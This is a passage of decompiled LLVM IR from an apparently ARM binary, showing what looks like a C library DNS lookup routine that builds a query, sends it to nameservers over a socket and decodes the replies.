  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %tmp147 = call i32 @__decompiler_undefined_function_0()
  %tmp151 = call i32 @__decompiler_undefined_function_0()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %tmp157 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v3_10460 = load i32, i32* @r4, align 4
  %v6_10460 = load i32, i32* @r5, align 4
  %v9_10460 = load i32, i32* @r6, align 4
  %v12_10460 = load i32, i32* @r7, align 4
  %v15_10460 = load i32, i32* @r8, align 4
  %v18_10460 = load i32, i32* @sb, align 4
  %v21_10460 = load i32, i32* @sl, align 4
  store i32 %arg6, i32* @r8, align 4
  %v1_10480 = call i32 @malloc(i32 512)
  store i32 %v1_10480, i32* @r7, align 4
  %v1_1048c = call i32 @malloc(i32 1025)
  %v2_10490 = icmp eq i32 %v1_1048c, 0
  br i1 %v2_10490, label %.thread8, label %bb

bb:                                               ; preds = %entry
  %v1_10494 = load i32, i32* @r7, align 4
  %v3_10494 = icmp eq i32 %v1_10494, 0
  store i32 %v1_1048c, i32* %stack_var_-236, align 4
  br i1 %v3_10494, label %bb195, label %dec_label_pc_104a8

.thread8:                                         ; preds = %entry
  store i32 0, i32* %stack_var_-236, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_10b88

bb195:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_10b88

dec_label_pc_104a8:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v2_104ac = icmp eq i32 %arg3, 0
  br i1 %v2_104ac, label %dec_label_pc_10b88, label %dec_label_pc_104b4

dec_label_pc_104b4:                               ; preds = %dec_label_pc_104a8
  %v2_104b8 = load i8, i8* %arg1, align 1
  %v2_104bc = icmp eq i8 %v2_104b8, 0
  br i1 %v2_104bc, label %dec_label_pc_10b88, label %dec_label_pc_104c4

dec_label_pc_104c4:                               ; preds = %dec_label_pc_104b4
  %v3_104c8 = call i32 @strlen(i8* nonnull %arg1)
  %v2_104d0 = add i32 %v3_104c8, %tmp
  %v1_104d4 = add i32 %v2_104d0, -1
  %v2_104d4 = inttoptr i32 %v1_104d4 to i8*
  %v3_104d4 = load i8, i8* %v2_104d4, align 1
  %v2_104d8 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_104d8, i32* @r4, align 4
  %v7_104dc = icmp eq i8 %v3_104d4, 46
  %. = zext i1 %v7_104dc to i32
  store i32 %v2_104d8, i32* @r0, align 4
  %v1_10500 = call i32 @__pthread_return_void()
  %v1_10510 = call i32 @__pthread_return_0()
  %v2_1051c = load i32, i32* @global_var_20e48.694, align 4
  %v2_10520 = srem i32 %v2_1051c, %arg3
  %v3_10528 = load i8, i8* @global_var_1e7b1.697, align 1
  %v4_10528 = zext i8 %v3_10528 to i32
  %v2_1052c = load i8, i8* bitcast (i8** @global_var_1e7b0.696 to i8*), align 4
  %v3_1052c = zext i8 %v2_1052c to i32
  %v4_10534 = mul nuw nsw i32 %v4_10528, 256
  %v5_10534 = or i32 %v3_1052c, %v4_10534
  store i32 %v5_10534, i32* @sb, align 4
  store i32 %v2_10520, i32* @sl, align 4
  store i32 %v2_104d8, i32* @r0, align 4
  %v1_10548 = call i32 @__pthread_return_void()
  %v0_10554 = load i32, i32* @r5, align 4
  %v2_10574 = ptrtoint i8* %stack_var_-188 to i32
  %v6_105b8 = bitcast i8* %stack_var_-188 to i32*
  %v2_10698 = ptrtoint i32* %stack_var_-92 to i32
  %v3_10730 = bitcast i8* %stack_var_-100 to %sockaddr*
  %v10_10794 = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_10ae0 = icmp eq i1 %v7_104dc, false
  %v7_107e8 = icmp eq i32 %tmp156, 3
  %tmp198 = icmp slt i32 %tmp155, 1
  %v2_108cc = ptrtoint i32* %stack_var_-140 to i32
  %v9_109c4 = icmp eq i32 %tmp147, %arg2
  %v7_10958 = icmp eq i32 %arg2, 1
  %v2_10900 = icmp eq i32 %tmp151, 0
  %tmp292 = icmp ult i32 %v0_10554, 3
  br i1 %tmp292, label %dec_label_pc_1055c.lr.ph.preheader.lr.ph, label %dec_label_pc_10b94

dec_label_pc_1055c.lr.ph.preheader.lr.ph:         ; preds = %dec_label_pc_104c4
  %v2_1086c = icmp eq i32 %tmp156, 0
  %v8_1095c = icmp eq i32 %arg2, 28
  br label %dec_label_pc_1055c.lr.ph.preheader

dec_label_pc_1055c:                               ; preds = %dec_label_pc_1055c.lr.ph, %dec_label_pc_10b78.backedge
  %v1_10564 = phi i32 [ %stack_var_-216.1.ph84, %dec_label_pc_1055c.lr.ph ], [ %v0_1070c, %dec_label_pc_10b78.backedge ]
  %stack_var_-208.567 = phi i32 [ %stack_var_-208.5.ph83, %dec_label_pc_1055c.lr.ph ], [ %stack_var_-208.5.be, %dec_label_pc_10b78.backedge ]
  %v7_10560 = icmp eq i32 %v1_10564, -1
  br i1 %v7_10560, label %bb200, label %bb199

bb199:                                            ; preds = %dec_label_pc_1055c
  br label %bb200

bb200:                                            ; preds = %dec_label_pc_1055c, %bb199
  %v1_10568 = xor i1 %v7_10560, true
  call void @__pseudo_cond_branch(i1 %v1_10568, i32 ptrtoint (i32* @global_var_a9f4.699 to i32))
  store i32 512, i32* @r2, align 4
  store i32 %v2_10574, i32* @r4, align 4
  %v0_10578 = load i32, i32* @r7, align 4
  %v2_1057c = inttoptr i32 %v0_10578 to i8*
  %v3_1057c = call i32 @__GI_memset(i8* %v2_1057c, i32 0)
  store i32 48, i32* @r2, align 4
  %v3_1058c = call i32 @__GI_memset(i8* nonnull %stack_var_-188, i32 0)
  %v0_10590 = load i32, i32* @sb, align 4
  %v1_10590 = add i32 %v0_10590, 1
  %v3_10598 = urem i32 %v1_10590, 65536
  store i32 %v3_10598, i32* @sb, align 4
  %v0_105a4 = load i32, i32* @r7, align 4
  %v5_105b0 = trunc i32 %v1_10590 to i8
  store i8 %v5_105b0, i8* %stack_var_-188, align 1
  %v7_105b8 = call i32 @__encode_header(i32* %v6_105b8, i32 %v0_105a4, i32 512, i32 1, i32 %v1_10590)
  store i32 %v7_105b8, i32* @r5, align 4
  %v1_105bc = icmp slt i32 %v7_105b8, 0
  br i1 %v1_105bc, label %dec_label_pc_10b94, label %dec_label_pc_105c4

dec_label_pc_105c4:                               ; preds = %bb200
  store i32 %tmp, i32* @r1, align 4
  %v2_105cc = load i32, i32* %stack_var_-236, align 4
  %v4_105d0 = call i32 @strncpy(i32 %v2_105cc, i32 %tmp, i32 1025)
  store i32 %v2_104d8, i32* @r0, align 4
  %v1_105e8 = call i32 @__pthread_return_void()
  %v1_105f8 = call i32 @__pthread_return_0()
  %v1_10608 = load i32, i32* @sl, align 4
  %v4_10608 = mul i32 %v1_10608, 4
  %v5_10608 = add i32 %v4_10608, %arg4
  %v6_10608 = inttoptr i32 %v5_10608 to i32*
  %v7_10608 = load i32, i32* %v6_10608, align 4
  store i32 %v7_10608, i32* @r6, align 4
  br i1 %v1_10604, label %dec_label_pc_1064c, label %dec_label_pc_10610

dec_label_pc_10610:                               ; preds = %dec_label_pc_105c4
  %v2_10618 = load i32, i32* @global_var_20eb0.702, align 4
  %v6_10620 = icmp slt i32 %v6_10b3c, %v2_10618
  br i1 %v6_10620, label %dec_label_pc_10624, label %dec_label_pc_1064c

dec_label_pc_10624:                               ; preds = %dec_label_pc_10610
  store i32 ptrtoint (i32* @global_var_15600.704 to i32), i32* @r1, align 4
  %v2_1062c = load i32, i32* %stack_var_-236, align 4
  %v4_10630 = inttoptr i32 %v2_1062c to i8*
  %v5_10630 = call i32 @__GI_strncat(i8* %v4_10630, i32 ptrtoint (i32* @global_var_15600.704 to i32), i32 1025, i32 %v2_10618)
  %v7_10640 = load i32, i32* %v6_10640, align 4
  store i32 %v7_10640, i32* @r1, align 4
  %v4_10648 = inttoptr i32 %v2_1062c to i8*
  %v5_10648 = call i32 @__GI_strncat(i8* %v4_10648, i32 %v7_10640, i32 1025, i32 ptrtoint (i32* @global_var_20e90.706 to i32))
  br label %dec_label_pc_1064c

dec_label_pc_1064c:                               ; preds = %dec_label_pc_10610, %dec_label_pc_105c4, %dec_label_pc_10624
  store i32 %v2_104d8, i32* @r0, align 4
  store i32 67168, i32* @lr, align 4
  %v1_1065c = call i32 @__pthread_return_void()
  %v2_10668 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_10668, i32* %stack_var_-56, align 4
  %v0_10678 = load i32, i32* @r7, align 4
  %v1_10678 = load i32, i32* @r5, align 4
  %v2_10678 = add i32 %v1_10678, %v0_10678
  %v1_1067c = sub i32 512, %v1_10678
  %v8_10684 = call i32 @__encode_question(i32* nonnull %stack_var_-56, i32 %v2_10678, i32 %v1_1067c, i32 %arg2, i32 %v2_10668, i32 %arg2, i32 1)
  store i32 %v8_10684, i32* @fp, align 4
  %v1_10688 = icmp slt i32 %v8_10684, 0
  br i1 %v1_10688, label %dec_label_pc_10b94, label %dec_label_pc_10690

dec_label_pc_10690:                               ; preds = %dec_label_pc_1064c
  store i32 0, i32* @r4, align 4
  %v0_106a0 = load i32, i32* @r6, align 4
  store i8 2, i8* %stack_var_-100, align 1
  %v3_106ac = inttoptr i32 %v0_106a0 to i8*
  %v4_106ac = call i32 @inet_pton(i32 10, i8* %v3_106ac, i32 %v2_10698)
  %v1_106b0 = load i32, i32* @r4, align 4
  %v7_106b4 = icmp sgt i32 %v4_106ac, %v1_106b0
  br i1 %v7_106b4, label %bb201, label %dec_label_pc_10690..thread11_crit_edge

dec_label_pc_10690..thread11_crit_edge:           ; preds = %dec_label_pc_10690
  %v3_106c0.pre = load i8, i8* %stack_var_-100, align 1
  br label %.thread11

bb201:                                            ; preds = %dec_label_pc_10690
  store i8 10, i8* %stack_var_-100, align 1
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_10690..thread11_crit_edge, %bb201
  %v3_106c0 = phi i8 [ %v3_106c0.pre, %dec_label_pc_10690..thread11_crit_edge ], [ 10, %bb201 ]
  %v4_106c0 = sext i8 %v3_106c0 to i32
  %v8_106bc.op = urem i32 %v1_106b0, 256
  %v8_106bc.op.op = mul nuw nsw i32 %v8_106bc.op, 256
  %v4_106c8 = select i1 %v7_106b4, i32 %v8_106bc.op.op, i32 0
  %v5_106c8 = or i32 %v4_106c0, %v4_106c8
  %v7_106cc = icmp eq i32 %v5_106c8, 10
  br i1 %v7_106cc, label %dec_label_pc_106f8, label %dec_label_pc_106e0

dec_label_pc_106e0:                               ; preds = %.thread11
  %v0_106e4 = load i32, i32* @r6, align 4
  store i32 %v0_106e4, i32* @r0, align 4
  %v1_106f0 = call i32 @inet_addr(i32 %v0_106e4)
  br label %dec_label_pc_106f8

dec_label_pc_106f8:                               ; preds = %.thread11, %dec_label_pc_106e0
  %v0_1070c = call i32 @socket()
  %v1_10710 = icmp slt i32 %v0_1070c, 0
  br i1 %v1_10710, label %.thread, label %dec_label_pc_10728

.thread:                                          ; preds = %dec_label_pc_106f8
  br label %dec_label_pc_10b78.backedge

dec_label_pc_10b78.backedge:                      ; preds = %.thread, %.thread13
  %stack_var_-208.5.be = add i32 %stack_var_-208.567, 1
  %tmp293 = icmp ult i32 %stack_var_-208.5.be, 3
  br i1 %tmp293, label %dec_label_pc_1055c, label %dec_label_pc_10b94

dec_label_pc_10728:                               ; preds = %dec_label_pc_106f8
  %v4_10730 = call i32 @__libc_connect(i32 %v0_1070c, %sockaddr* nonnull %v3_10730, i32 28)
  %v1_10734 = icmp slt i32 %v4_10730, 0
  br i1 %v1_10734, label %dec_label_pc_1073c, label %dec_label_pc_1075c

dec_label_pc_1073c:                               ; preds = %dec_label_pc_10728
  %v0_1073c = call i32 @__errno_location()
  %v1_10740 = inttoptr i32 %v0_1073c to i32*
  %v2_10740 = load i32, i32* %v1_10740, align 4
  %v7_10744 = icmp eq i32 %v2_10740, 101
  br i1 %v7_10744, label %dec_label_pc_10aa8, label %.thread13

.thread13:                                        ; preds = %dec_label_pc_1073c
  br label %dec_label_pc_10b78.backedge

dec_label_pc_1075c:                               ; preds = %dec_label_pc_10728
  %v0_1075c = load i32, i32* @r5, align 4
  %v1_1075c = load i32, i32* @fp, align 4
  %v2_1075c = add i32 %v1_1075c, %v0_1075c
  %v0_10760 = load i32, i32* @r7, align 4
  %v4_1076c = inttoptr i32 %v0_10760 to i32*
  %v5_1076c = call i32 @__libc_send(i32 %v0_1070c, i32* %v4_1076c, i32 %v2_1075c, i32 0)
  store i32 0, i32* @r4, align 4
  store i32 %v0_1070c, i32* %stack_var_-44, align 4
  %v11_10794 = call i32 @__libc_poll(%pollfd* %v10_10794, i32 1, i32 10000, i32 1, i32 %v0_1070c, i32 1, i32 0)
  %v1_10798 = load i32, i32* @r4, align 4
  %v7_1079c = icmp sgt i32 %v11_10794, %v1_10798
  br i1 %v7_1079c, label %dec_label_pc_107a0, label %dec_label_pc_10aa8

dec_label_pc_107a0:                               ; preds = %dec_label_pc_1075c
  %v0_107a8 = load i32, i32* @r7, align 4
  %v4_107b0 = inttoptr i32 %v0_107a8 to i32*
  %v5_107b0 = call i32 @__libc_recv(i32 %v0_1070c, i32* %v4_107b0, i32 512, i32 %v1_10798)
  store i32 %v5_107b0, i32* @fp, align 4
  %v7_107bc = icmp slt i32 %v5_107b0, 12
  br i1 %v7_107bc, label %dec_label_pc_10adc, label %dec_label_pc_107c0

dec_label_pc_107c0:                               ; preds = %dec_label_pc_107a0
  %v0_107c0 = load i32, i32* @r7, align 4
  %v2_107c8 = inttoptr i32 %v0_107c0 to i8*
  %v3_107c8 = call i32 @__decode_header(i8* %v2_107c8, i32 %v2_10574)
  %v3_107cc = load i8, i8* %stack_var_-188, align 1
  %v4_107cc = sext i8 %v3_107cc to i32
  store i32 %v4_107cc, i32* @r6, align 4
  %v1_107d0 = load i32, i32* @sb, align 4
  %v9_107d0 = icmp eq i32 %v4_107cc, %v1_107d0
  br i1 %v9_107d0, label %dec_label_pc_107d8, label %dec_label_pc_10adc

dec_label_pc_107d8:                               ; preds = %dec_label_pc_107c0
  %v1_107dc = load i32, i32* @r4, align 4
  %v9_107dc = icmp eq i32 %tmp157, %v1_107dc
  br i1 %v9_107dc, label %dec_label_pc_10adc, label %dec_label_pc_107e4

dec_label_pc_107e4:                               ; preds = %dec_label_pc_107d8
  br i1 %v7_107e8, label %dec_label_pc_107f0, label %dec_label_pc_1086c

dec_label_pc_107f0:                               ; preds = %dec_label_pc_107e4
  %v9_107f4 = icmp eq i32 %., %v1_107dc
  br i1 %v9_107f4, label %dec_label_pc_107fc, label %dec_label_pc_10860

dec_label_pc_107fc:                               ; preds = %dec_label_pc_107f0
  store i32 %v2_104d8, i32* @r5, align 4
  store i32 %v2_104d8, i32* @r0, align 4
  %v1_10814 = call i32 @__pthread_return_void()
  %v1_10824 = call i32 @__pthread_return_0()
  store i32 %v2_104d8, i32* @r0, align 4
  %v2_10830 = load i32, i32* @global_var_20eb0.702, align 4
  %v1_10840 = call i32 @__pthread_return_void()
  %v1_10848 = add i32 %v2_10830, -1
  store i32 %v1_10848, i32* @r4, align 4
  %v5_10850 = icmp slt i32 %v6_10b3c, %v1_10848
  br i1 %v5_10850, label %.thread19, label %dec_label_pc_10860

.thread19:                                        ; preds = %dec_label_pc_107fc
  %v7_10850 = add i32 %v6_10b3c, 1
  %v6_10854 = load i32, i32* @r6, align 4
  store i32 %v6_10854, i32* @sb, align 4
  br label %dec_label_pc_10b78.outer.backedge

dec_label_pc_10860:                               ; preds = %dec_label_pc_107fc, %dec_label_pc_107f0
  %v0_10860 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10890

dec_label_pc_1086c:                               ; preds = %dec_label_pc_107e4
  br i1 %v2_1086c, label %dec_label_pc_10874, label %dec_label_pc_10adc

dec_label_pc_10874:                               ; preds = %dec_label_pc_1086c
  br i1 %tmp198, label %dec_label_pc_10888, label %dec_label_pc_108a0.preheader

dec_label_pc_108a0.preheader:                     ; preds = %dec_label_pc_10874
  store i32 12, i32* @r5, align 4
  br label %dec_label_pc_108a0

dec_label_pc_10888:                               ; preds = %dec_label_pc_10874
  %v0_10888 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10890

dec_label_pc_10890:                               ; preds = %dec_label_pc_10860, %dec_label_pc_10888
  %storemerge4 = phi i32 [ %v0_10888, %dec_label_pc_10888 ], [ %v0_10860, %dec_label_pc_10860 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_10888 ], [ 1, %dec_label_pc_10860 ]
  %v2_10890 = inttoptr i32 %storemerge4 to i32*
  store i32 %storemerge, i32* %v2_10890, align 4
  br label %dec_label_pc_10ba4

dec_label_pc_10898:                               ; preds = %dec_label_pc_108a0
  %v2_10898 = call i32 @__length_question(i32 %v0_108ac, i32 %v0_108a8)
  %v0_1089c = load i32, i32* @r5, align 4
  %v2_1089c = add i32 %v0_1089c, %v2_10898
  store i32 %v2_1089c, i32* @r5, align 4
  %v0_108a4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_108a0

dec_label_pc_108a0:                               ; preds = %dec_label_pc_108a0.preheader, %dec_label_pc_10898
  %v0_108a8 = phi i32 [ 12, %dec_label_pc_108a0.preheader ], [ %v2_1089c, %dec_label_pc_10898 ]
  %v0_108b0 = phi i32 [ 0, %dec_label_pc_108a0.preheader ], [ %v0_108a4.pre, %dec_label_pc_10898 ]
  store i32 %v0_108a8, i32* @r1, align 4
  %v0_108ac = load i32, i32* @r7, align 4
  store i32 %v0_108ac, i32* @r0, align 4
  %v1_108b0 = add i32 %v0_108b0, 1
  store i32 %v1_108b0, i32* @r4, align 4
  %v5_108b4 = icmp slt i32 %v0_108b0, 1
  br i1 %v5_108b4, label %dec_label_pc_10898, label %dec_label_pc_108b8

dec_label_pc_108b8:                               ; preds = %dec_label_pc_108a0
  br label %dec_label_pc_10a14

dec_label_pc_108cc:                               ; preds = %bb205
  store i32 %v2_108cc, i32* @r4, align 4
  %v0_108d0 = load i32, i32* @r7, align 4
  %v0_108d8 = load i32, i32* @fp, align 4
  %v5_108e0 = call i32 @__decode_answer(i32 %v0_108d0, i32 %v0_108d4, i32 %v0_108d8, i32* nonnull %stack_var_-140)
  %v1_108e4 = icmp slt i32 %v5_108e0, 0
  br i1 %v1_108e4, label %dec_label_pc_108f0, label %dec_label_pc_1090c

dec_label_pc_108f0:                               ; preds = %dec_label_pc_108cc
  %v2_108f4 = icmp eq i32 %stack_var_-192.0, 0
  br i1 %v2_108f4, label %dec_label_pc_10adc, label %dec_label_pc_108fc

dec_label_pc_108fc:                               ; preds = %dec_label_pc_108f0
  br i1 %v2_10900, label %dec_label_pc_10adc, label %dec_label_pc_10a28

dec_label_pc_1090c:                               ; preds = %dec_label_pc_108cc
  %v2_10910 = icmp eq i32 %stack_var_-212.2, 0
  br i1 %v2_10910, label %dec_label_pc_109b4, label %dec_label_pc_10918

dec_label_pc_10918:                               ; preds = %dec_label_pc_1090c
  %v0_10918 = load i32, i32* @r8, align 4
  %v6_1091c = add i32 %v0_10918, 36
  %v7_1091c = inttoptr i32 %v6_1091c to i32*
  %v8_1091c = load i32, i32* %v7_1091c, align 4
  store i32 %v8_1091c, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v2_108cc, i32* @r1, align 4
  store i32 %v0_10918, i32* @r0, align 4
  %v0_10938 = call i32 @memcpy()
  %v0_1093c = load i32, i32* @r8, align 4
  %v1_1093c = add i32 %v0_1093c, 4
  %v2_1093c = inttoptr i32 %v1_1093c to i32*
  %v3_1093c = load i32, i32* %v2_1093c, align 4
  %v7_10940 = icmp eq i32 %v3_1093c, 24
  br i1 %v7_10940, label %dec_label_pc_10964, label %dec_label_pc_10948

dec_label_pc_10948:                               ; preds = %dec_label_pc_10918
  %v1_10948 = add i32 %v0_1093c, 28
  %v2_10948 = inttoptr i32 %v1_10948 to i32*
  %v3_10948 = load i32, i32* %v2_10948, align 4
  %v2_1094c = icmp eq i32 %v3_10948, 0
  br i1 %v2_1094c, label %dec_label_pc_10a28, label %dec_label_pc_10954

dec_label_pc_10954:                               ; preds = %dec_label_pc_10948
  br i1 %v7_10958, label %dec_label_pc_10964, label %bb203

bb203:                                            ; preds = %dec_label_pc_10954
  br i1 %v8_1095c, label %dec_label_pc_10964, label %dec_label_pc_10a28

dec_label_pc_10964:                               ; preds = %dec_label_pc_10954, %bb203, %dec_label_pc_10918
  %v9_10968 = icmp eq i32 %v3_1093c, %arg2
  br i1 %v9_10968, label %dec_label_pc_1097c, label %dec_label_pc_10970

dec_label_pc_10970:                               ; preds = %dec_label_pc_10964
  %v1_10970 = inttoptr i32 %v0_1093c to i32*
  %v2_10970 = load i32, i32* %v1_10970, align 4
  store i32 %v2_10970, i32* @r0, align 4
  %v0_10974 = call i32 @free()
  br label %dec_label_pc_10a00

dec_label_pc_1097c:                               ; preds = %dec_label_pc_10964
  %v1_10984 = add i32 %v0_1093c, 16
  %v2_10984 = inttoptr i32 %v1_10984 to i32*
  %v3_10984 = load i32, i32* %v2_10984, align 4
  %v2_10988 = sub i32 %tmp155, %stack_var_-192.0
  %v1_1098c = add i32 %v2_10988, -1
  %v1_10990 = add i32 %v3_10984, 4
  %v2_10994 = mul i32 %v1_10990, %v1_1098c
  %v1_10998 = add i32 %v0_1093c, 32
  %v2_10998 = inttoptr i32 %v1_10998 to i32*
  %v3_10998 = load i32, i32* %v2_10998, align 4
  %v2_109a0 = add i32 %v0_1093c, 36
  %v3_109a0 = inttoptr i32 %v2_109a0 to i32*
  store i32 %v1_1098c, i32* %v3_109a0, align 4
  %tmp294 = icmp ugt i32 %v2_10994, %v3_10998
  br i1 %tmp294, label %dec_label_pc_10a28, label %dec_label_pc_1097c.dec_label_pc_109fc_crit_edge

dec_label_pc_1097c.dec_label_pc_109fc_crit_edge:  ; preds = %dec_label_pc_1097c
  %v1_109fc.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_109fc

dec_label_pc_109b4:                               ; preds = %dec_label_pc_1090c
  %v3_109b4 = load i32, i32* %stack_var_-140, align 4
  store i32 %v3_109b4, i32* @r0, align 4
  %v0_109b8 = call i32 @free()
  br i1 %v9_109c4, label %dec_label_pc_109cc, label %dec_label_pc_10a00

dec_label_pc_109cc:                               ; preds = %dec_label_pc_109b4
  %v0_109cc = load i32, i32* @r8, align 4
  %v1_109cc = add i32 %v0_109cc, 16
  %v2_109cc = inttoptr i32 %v1_109cc to i32*
  %v3_109cc = load i32, i32* %v2_109cc, align 4
  %v9_109d4 = icmp eq i32 %v3_109cc, %tmp146
  br i1 %v9_109d4, label %dec_label_pc_109dc, label %dec_label_pc_10ad4

dec_label_pc_109dc:                               ; preds = %dec_label_pc_109cc
  %v1_109dc = add i32 %v0_109cc, 36
  %v2_109dc = inttoptr i32 %v1_109dc to i32*
  %v3_109dc = load i32, i32* %v2_109dc, align 4
  %v1_109e0 = add i32 %v0_109cc, 28
  %v2_109e0 = inttoptr i32 %v1_109e0 to i32*
  %v3_109e0 = load i32, i32* %v2_109e0, align 4
  %v3_109e4 = mul i32 %v3_109dc, %tmp146
  %v4_109e4 = add i32 %v3_109e0, %v3_109e4
  store i32 %v4_109e4, i32* @r0, align 4
  store i32 %tmp146, i32* @r2, align 4
  %v0_109f0 = call i32 @memcpy()
  %v0_109f4 = load i32, i32* @r8, align 4
  %v1_109f4 = add i32 %v0_109f4, 36
  %v2_109f4 = inttoptr i32 %v1_109f4 to i32*
  %v3_109f4 = load i32, i32* %v2_109f4, align 4
  %v1_109f8 = add i32 %v3_109f4, 1
  br label %dec_label_pc_109fc

dec_label_pc_109fc:                               ; preds = %dec_label_pc_1097c.dec_label_pc_109fc_crit_edge, %dec_label_pc_109dc
  %v1_109fc = phi i32 [ %v0_109f4, %dec_label_pc_109dc ], [ %v1_109fc.pre, %dec_label_pc_1097c.dec_label_pc_109fc_crit_edge ]
  %storemerge5 = phi i32 [ %v1_109f8, %dec_label_pc_109dc ], [ 0, %dec_label_pc_1097c.dec_label_pc_109fc_crit_edge ]
  %v2_109fc = add i32 %v1_109fc, 36
  %v3_109fc = inttoptr i32 %v2_109fc to i32*
  store i32 %storemerge5, i32* %v3_109fc, align 4
  br label %dec_label_pc_10a00

dec_label_pc_10a00:                               ; preds = %dec_label_pc_109b4, %dec_label_pc_10970, %dec_label_pc_109fc
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_109fc ], [ 0, %dec_label_pc_109b4 ], [ %stack_var_-212.2, %dec_label_pc_10970 ]
  %v1_10a08 = add i32 %stack_var_-192.0, 1
  %v0_10a10 = load i32, i32* @r5, align 4
  %v2_10a10 = add i32 %v0_10a10, %v5_108e0
  store i32 %v2_10a10, i32* @r5, align 4
  br label %dec_label_pc_10a14

dec_label_pc_10a14:                               ; preds = %dec_label_pc_108b8, %dec_label_pc_10a00
  %v0_108d4 = phi i32 [ %v0_108a8, %dec_label_pc_108b8 ], [ %v2_10a10, %dec_label_pc_10a00 ]
  %stack_var_-212.2 = phi i32 [ 1, %dec_label_pc_108b8 ], [ %stack_var_-212.1, %dec_label_pc_10a00 ]
  %stack_var_-192.0 = phi i32 [ 0, %dec_label_pc_108b8 ], [ %v1_10a08, %dec_label_pc_10a00 ]
  %v2_10a1c = sub i32 %stack_var_-192.0, %tmp155
  %v4_10a1c = xor i32 %stack_var_-192.0, %tmp155
  %v5_10a1c = xor i32 %v2_10a1c, %stack_var_-192.0
  %v6_10a1c = and i32 %v5_10a1c, %v4_10a1c
  %v5_10a20 = icmp slt i32 %stack_var_-192.0, %tmp155
  br i1 %v5_10a20, label %bb204, label %bb205

bb204:                                            ; preds = %dec_label_pc_10a14
  %v7_10a20 = load i32, i32* @fp, align 4
  %v8_10a20 = sub i32 %v0_108d4, %v7_10a20
  %v10_10a20 = xor i32 %v7_10a20, %v0_108d4
  %v11_10a20 = xor i32 %v8_10a20, %v0_108d4
  %v12_10a20 = and i32 %v11_10a20, %v10_10a20
  br label %bb205

bb205:                                            ; preds = %dec_label_pc_10a14, %bb204
  %v1_10a24.in = phi i32 [ %v6_10a1c, %dec_label_pc_10a14 ], [ %v12_10a20, %bb204 ]
  %v0_10a24.in = phi i32 [ %v2_10a1c, %dec_label_pc_10a14 ], [ %v8_10a20, %bb204 ]
  %v0_10a24 = icmp slt i32 %v0_10a24.in, 0
  %v1_10a24 = icmp slt i32 %v1_10a24.in, 0
  %v2_10a24 = xor i1 %v1_10a24, %v0_10a24
  br i1 %v2_10a24, label %dec_label_pc_108cc, label %dec_label_pc_10a28

dec_label_pc_10a28:                               ; preds = %dec_label_pc_108fc, %bb203, %dec_label_pc_1097c, %dec_label_pc_10948, %bb205
  %v1_10a2c = call i32 @__libc_close(i32 %v0_1070c)
  %v3_10a30 = load i32, i32* %stack_var_0, align 4
  %v2_10a34 = icmp eq i32 %v3_10a30, 0
  br i1 %v2_10a34, label %.thread26, label %bb206

bb206:                                            ; preds = %dec_label_pc_10a28
  %v1_10a3c = load i32, i32* @r7, align 4
  %v3_10a38 = inttoptr i32 %v3_10a30 to i32*
  store i32 %v1_10a3c, i32* %v3_10a38, align 4
  br label %bb207

.thread26:                                        ; preds = %dec_label_pc_10a28
  br label %bb207

bb207:                                            ; preds = %bb206, %.thread26
  store i32 68164, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10a34, i32 ptrtoint (i32* @global_var_d4a4.413 to i32))
  %v2_10a44 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_10a44, i32* @r0, align 4
  store i32 %v2_104d8, i32* @r4, align 4
  %v0_10a4c = call i32 @free()
  store i32 %v2_104d8, i32* @r0, align 4
  %v1_10a64 = call i32 @__pthread_return_void()
  %v1_10a74 = call i32 @__pthread_return_0()
  %v0_10a80 = load i32, i32* @r6, align 4
  %v3_10a80 = sdiv i32 %v0_10a80, 256
  %v0_10a84 = load i32, i32* @sl, align 4
  store i32 %v0_10a84, i32* @global_var_20e48.694, align 4
  store i32 %v2_104d8, i32* @r0, align 4
  %v1_10a90 = trunc i32 %v3_10a80 to i8
  store i8 %v1_10a90, i8* @global_var_1e7b1.697, align 1
  %v1_10a94 = trunc i32 %v0_10a80 to i8
  store i8 %v1_10a94, i8* bitcast (i8** @global_var_1e7b0.696 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_10aa4.708 to i32), i32* @lr, align 4
  %v1_10aa0 = call i32 @__pthread_return_void()
  %v0_10c2c.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_10c2c

dec_label_pc_10aa8:                               ; preds = %dec_label_pc_1073c, %dec_label_pc_1075c
  %v0_10aa8 = load i32, i32* @sl, align 4
  %v1_10aa8 = add i32 %v0_10aa8, 1
  %v2_10ab0 = srem i32 %v1_10aa8, %arg3
  store i32 %v2_10ab0, i32* @sl, align 4
  %v2_10ab4 = icmp eq i32 %v2_10ab0, 0
  br i1 %v2_10ab4, label %dec_label_pc_10abc, label %dec_label_pc_10b74.backedge

dec_label_pc_10abc:                               ; preds = %dec_label_pc_10aa8
  %v1_10ac4 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_10b78.outer.backedge

dec_label_pc_10b78.outer.backedge:                ; preds = %dec_label_pc_10abc, %dec_label_pc_10b58, %.thread19
